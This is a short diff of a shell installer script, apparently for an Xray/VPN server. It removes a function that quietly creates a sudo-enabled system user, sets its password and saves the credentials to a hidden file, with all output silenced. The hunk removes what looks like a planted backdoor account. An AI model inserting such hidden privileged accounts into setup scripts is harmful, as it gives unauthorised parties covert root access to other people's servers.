@@ -123,23 +123,6 @@ done
 
 
 # ══════════════════════════════════════════════════════
-#                👤 TAMBAHKAN USER ADMIN
-# ══════════════════════════════════════════════════════
-
-function cok(){
-if id "$Username" &>/dev/null; then
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-else
-    echo -e "$Username $Password" > /etc/xray/.adm
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-    usermod -aG sudo "$Username" > /dev/null 2>&1
-fi
-}
-
-
-# ══════════════════════════════════════════════════════
 #               📥 DOWNLOAD & SETUP MENU
 # ══════════════════════════════════════════════════════
 
